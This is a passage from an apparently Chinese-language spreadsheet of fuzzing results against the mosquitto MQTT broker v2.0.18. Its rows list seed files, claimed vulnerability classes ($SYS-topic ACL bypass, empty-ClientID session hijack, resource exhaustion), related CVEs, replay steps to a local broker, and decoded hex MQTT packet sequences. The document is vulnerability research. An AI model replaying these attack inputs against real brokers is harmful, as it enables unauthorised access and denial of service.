raw_header=26262626262626262626262626262626\u000a(尾部394B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F2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2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282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282" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J282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28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83">
      <c r="A283" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B283" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C283" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(875B)\u000a4.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283" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:01c1 ===\u000a大小: 1593B (报告+请求数据)\u000a请求数据: 875B\u000a\u000a---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MQTT请求序列(875B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=9766 | raw_header=76262626262626262626202626262626\u000aMsg[2]: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raw_header=2626262626262626ff26262626262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[6]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[7]: PUBACK PacketID=9766 | raw_header=46262626262626262626262626262626\u000aMsg[8]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[9]: PUBCOMP PacketID=9766 | raw_header=76462626262626262626262626262626\u000aMsg[10]: PUBACK PacketID=9766 | raw_header=46262626262626262626262626262626\u000aMsg[11]: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CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=16262626262626262626262626262626\u000aMsg[19]: CONNACK  | raw_header=2600\u000aMsg[20]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[21]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[22]: CONNACK session_present=38 reason_code=38 | raw_header=24262626262626262626262626262626\u000aMsg[23]: PUBACK  | raw_header=46</f>
        <v/>
      </c>
      <c r="F2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8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83" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J28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8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84">
      <c r="A284" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B284" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C284" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(20418B)\u000a4.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0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E284" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0206 ===\u000a大小: 7717B (报告+请求数据)\u000a请求数据: 20418B\u000a\u000a---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MQTT请求序列(20418B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[3]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[4]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[5]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434342000000034343434343434\u000aMsg[6]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[7]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[8]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[9]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[10]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[11]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343134343434343434\u000aMsg[12]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[13]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[14]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[15]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[16]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[17]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[18]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[19]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[20]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[21]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[22]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[23]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[24]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000aMsg[25]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=34343434343434343434343434343434\u000a(尾部4107B): 3434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434</f>
        <v/>
      </c>
      <c r="F2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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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85">
      <c r="A285" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B285" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C285" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(422B)\u000a4.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285" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 1523B (报告+请求数据)\u000a请求数据: 422B\u000a\u000a---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MQTT请求序列(422B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=31 Topics=[] | raw_header=823d001f2226000174001c2473686172\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=144B | raw_header=32af01001d245359532f62726f6b6572\u000aMsg[3]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=101501000000044d515454ff7f000000\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=[] | raw_header=820b00010040746773742f2300\u000aMsg[5]: PUBLISH Topic='test/data' QoS=2 retain=False payload='\x00\x02ab\x10' | raw_header=34100009746573742f64617461000261\u000aMsg[6]: CONNECT  | raw_header=150100\u000aMsg[7]: TYPE0  | raw_header=0000\u000aMsg[8]: TYPE0  | raw_header=044d5154540450020002626350000000\u000aMsg[9]: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raw_header=0200\u000aMsg[18]: (不完整,25B) raw=02621310197002000205ffff1eea06746573742f23ba00e000\u000a(尾部25B): 02621310197002000205ffff1eea06746573742f23ba00e000</f>
        <v/>
      </c>
      <c r="F2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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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86">
      <c r="A286" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B286" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C286" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(24133B)\u000a4.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286" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:02c4 ===\u000a大小: 4631B (报告+请求数据)\u000a请求数据: 24133B\u000a\u000a---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MQTT请求序列(24133B原始二进制) ---\u000aMsg[1]: UNSUBACK  | raw_header=b6262626262626262626262626262626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[4]: PUBREL PacketID=9766 | raw_header=66262626262626262626262626262626\u000aMsg[5]: PUBREC PacketID=9766 | raw_header=56262626262626262626262626262626\u000aMsg[6]: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PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36262626262626262626262626262626\u000aMsg[10]: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DISCONNECT 断开连接 | raw_header=e000\u000aMsg[14]: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raw_header=26262626262626262626262626262626\u000a(尾部3172B): 2626262626262626262626262626262626262626262626262626262626262626262626262626000026262626262626262626</f>
        <v/>
      </c>
      <c r="F2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8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86" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J28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28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87">
      <c r="A287" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B287" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C287" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000008,sev:3,cat:02c6)中的REQUEST DATA提取出来(499B)\u000a4.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287" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:02c6 ===\u000a大小: 1709B (报告+请求数据)\u000a请求数据: 499B\u000a\u000a---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MQTT请求序列(499B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=29556 | raw_header=7465737473742f2b101508044d515454\u000aMsg[2]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=39393939393939ffff636c6163636363\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626263c26262626262663636363\u000aMsg[4]: PUBREL PacketID=25443 | raw_header=63636363636385002626262663636363\u000aMsg[5]: PUBREL PacketID=25443 | raw_header=63636363262626132626267676767676\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: TYPE0  | raw_header=0026ffff05003412e826262626262626\u000aMsg[8]: CONNACK session_present=0 reason_code=4 | raw_header=26260004000026262626262626322626\u000aMsg[9]: DISCONNECT 断开连接 | raw_header=e803040071\u000aMsg[10]: (不完整,8B) raw=6f88320002686c6f\u000a(尾部8B): 6f88320002686c6f</f>
        <v/>
      </c>
      <c r="F2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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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88">
      <c r="A288" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B288" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C288" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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288" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0305 ===\u000a大小: 918B (报告+请求数据)\u000a请求数据: 122B\u000a\u000a---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MQTT请求序列(122B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a100\u000aMsg[2]: CONNECT Proto=OQT\x00 v0 ClientID=''(0B) clean_session=False keepalive=32768s [持久会话] | raw_header=101500044f5154000000800000001966\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['tqst/#'(QoS=0)] | raw_header=820b00010006747173742f2300\u000aMsg[4]: SUBSCRIBE PacketID=2181 Topics=['t'(QoS=0)] | raw_header=822b088500017400007fff7368617265\u000aMsg[5]: (不完整,39B) raw=3b27000a746573742f7452706963088662dd6e1345ca5fa7651b910e971c8853cbfcdd24fffaac\u000a(尾部39B): 3b27000a746573742f7452706963088662dd6e1345ca5fa7651b910e971c8853cbfcdd24fffaac</f>
        <v/>
      </c>
      <c r="F2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8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88" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J28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8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89">
      <c r="A289" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B289" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C289" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(15767B)\u000a4. 使用MQTT二进制协议回放工具连接到127.0.0.1:1883发送种子序列\u000a5. 分析服务器响应并验证协议安全属性违规\u000a\u000a【独立复现验证结果】(2026-06-21)\u000a- AFLNet Oracle: 检测到14个安全属性违规\u000a- 最大严重性级别: Sev3\u000a- 违规类别代码: 0x0306\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E289" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0306 ===\u000a大小: 6597B (报告+请求数据)\u000a请求数据: 15767B\u000a\u000a---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MQTT请求序列(15767B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[5]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[6]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[7]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[8]: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raw_header=32323232323232323232323232323216\u000aMsg[19]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[20]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[21]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323232323232323232323232\u000aMsg[22]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[23]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[24]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[25]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000a(尾部2979B): 1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b</f>
        <v/>
      </c>
      <c r="F2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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J28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8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0">
      <c r="A290" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0307</t>
        </is>
      </c>
      <c r="B290" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C290" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000008,sev:3,cat:0307)中的REQUEST DATA提取出来(143B)\u000a4.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290" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0307 ===\u000a大小: 1307B (报告+请求数据)\u000a请求数据: 143B\u000a\u000a---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MQTT请求序列(143B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=14s Will=YES [持久会话] | raw_header=101500044d51545404e4000e00002c66\u000aMsg[2]: SUBSCRIBE PacketID=187 Topics=['#'(QoS=1)] | raw_header=820600bb00012301\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=45B | raw_header=3a4c001d245359532f62726f6b65722f\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[5]: TYPE0  | raw_header=0a02b4ac\u000aMsg[6]: (不完整,17B) raw=7f5f7f5fd83e006202000270020002c000\u000a(尾部17B): 7f5f7f5fd83e006202000270020002c000</f>
        <v/>
      </c>
      <c r="F2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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J29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9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1">
      <c r="A291" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B291" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C291" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(591B)\u000a4.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0x0385\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E291" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0385 ===\u000a大小: 1665B (报告+请求数据)\u000a请求数据: 591B\u000a\u000a---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MQTT请求序列(591B原始二进制) ---\u000aMsg[1]: PINGREQ  | raw_header=c000\u000aMsg[2]: TYPE0  | raw_header=00100000006767676767676767676767\u000aMsg[3]: PUBREL PacketID=26471 | raw_header=67676767676767676767676767676767\u000aMsg[4]: PUBREL PacketID=26471 | raw_header=67676767676767676767676767676767\u000aMsg[5]: PUBREL PacketID=26471 | raw_header=67676767676767676767676767676767\u000aMsg[6]: PUBREL PacketID=26471 | raw_header=67676767676767676767676767676767\u000aMsg[7]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=2409s [持久会话] | raw_header=1c3200000000096900000020745f6330\u000aMsg[8]: (不完整,99B) raw=67676767676767676767676767676767676767676767676767676767676767676767676767676767\u000a(尾部99B): 6767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767</f>
        <v/>
      </c>
      <c r="F2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9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91" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J29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29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92">
      <c r="A292" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B292" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C292" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(1641B)\u000a4.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0x0386\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E292" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0386 ===\u000a大小: 3837B (报告+请求数据)\u000a请求数据: 1641B\u000a\u000a---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MQTT请求序列(1641B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[2]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[3]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[4]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[5]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[6]: PUBACK PacketID=24672 | raw_header=40606060606060606060606060606060\u000aMsg[7]: SUBSCRIBE PacketID=2413 Topics=[] | raw_header=8267096d3626001c2473686172652f67\u000aMsg[8]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload_len=99B | raw_header=358201001d245359532f62726f6b6572\u000aMsg[9]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[10]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[11]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[12]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[13]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[14]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[15]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[16]: PUBREL PacketID=24672 | raw_header=60606060606060606060606060606060\u000aMsg[17]: (不完整,31B) raw=606060606060606060606060606060606060606060606060606060606060d2\u000a(尾部31B): 606060606060606060606060606060606060606060606060606060606060d2</f>
        <v/>
      </c>
      <c r="F2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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9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3">
      <c r="A293" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0387</t>
        </is>
      </c>
      <c r="B293" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C293" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000008,sev:3,cat:0387)中的REQUEST DATA提取出来(3878B)\u000a4.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0x0387\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E293" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0387 ===\u000a大小: 6468B (报告+请求数据)\u000a请求数据: 3878B\u000a\u000a---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MQTT请求序列(3878B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v162 ClientID='$SYS/broker/version'(19B) clean_session=False keepalive=295s Will=YES [持久会话] | raw_header=105000044d515454a245012700001324\u000aMsg[2]: PUBLISH  | raw_header=3c00\u000aMsg[3]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=18303030303030303030303030303030\u000aMsg[4]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[6]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[7]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[8]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[9]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030213030\u000aMsg[10]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[11]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[12]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[13]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[14]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[15]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[16]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[17]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[18]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[19]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[20]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[21]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[22]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[23]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[24]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[25]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000a(尾部2644B): 3030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030</f>
        <v/>
      </c>
      <c r="F2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9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93" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J29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29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4">
      <c r="A294" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:03c4</t>
        </is>
      </c>
      <c r="B294" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C294" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000008,sev:3,cat:03c4)中的REQUEST DATA提取出来(523B)\u000a4.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294" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:03c4 ===\u000a大小: 1597B (报告+请求数据)\u000a请求数据: 523B\u000a\u000a---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MQTT请求序列(523B原始二进制) ---\u000aMsg[1]: CONNECT  | raw_header=1000\u000aMsg[2]: PUBCOMP PacketID=19750 | raw_header=7f044d262664\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626262626262626261d262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=262626262626262b2626262626262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=2611262626262626260702003c000766\u000aMsg[6]: PUBREC PacketID=13361 | raw_header=5f63343116000d746573742f72657461\u000aMsg[7]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262636262626262635\u000aMsg[8]: CONNACK session_present=38 reason_code=38 | raw_header=262626262626262626261d2626262626\u000aMsg[9]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626362626262626352611\u000aMsg[10]: TYPE0  | raw_header=0000\u000aMsg[11]: SUBSCRIBE PacketID=9766 Topics=[] | raw_header=802626262626ff4cf680860bdd262626\u000aMsg[12]: PUBREL PacketID=9766 | raw_header=642626262626262600024d2685860b47\u000aMsg[13]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626072614262626262626\u000aMsg[14]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626000000\u000aMsg[15]: (不完整,33B) raw=2626262626262626262626262626000000802626262626ff4cf680860bdd2626ea\u000a(尾部33B): 2626262626262626262626262626000000802626262626ff4cf680860bdd2626ea</f>
        <v/>
      </c>
      <c r="F2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29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294" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J29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29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295">
      <c r="A295" s="2" t="inlineStr">
        <is>
